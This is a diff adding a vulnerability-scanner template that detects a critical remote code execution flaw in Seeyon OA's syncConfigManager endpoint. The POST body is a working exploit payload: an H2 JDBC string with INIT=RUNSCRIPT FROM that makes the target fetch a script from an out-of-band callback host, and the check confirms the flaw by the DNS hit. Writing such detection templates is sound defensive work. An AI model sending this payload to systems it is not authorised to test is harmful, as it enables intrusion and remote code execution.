@@ -1,0 +1,30 @@
+id: seeyon-syncconfigmanager-rce
+
+info:
+  name: Seeyon syncConfigManager Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,dns,critical
+  description: |
+    This template detects a remote code execution vulnerability in Seeyon OA syncConfigManager.
+
+variables:
+  domain: "{{interactsh-url}}"
+
+http:
+  - method: POST
+    path:
+      - "/seeyon/ajax.do?method=ajaxAction&managerName=syncConfigManager"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      managerMethod=checkIsCreate&arguments=["","org.h2.Driver","jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT%20FROM%20'http://{{domain}}'","a","","",""]
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
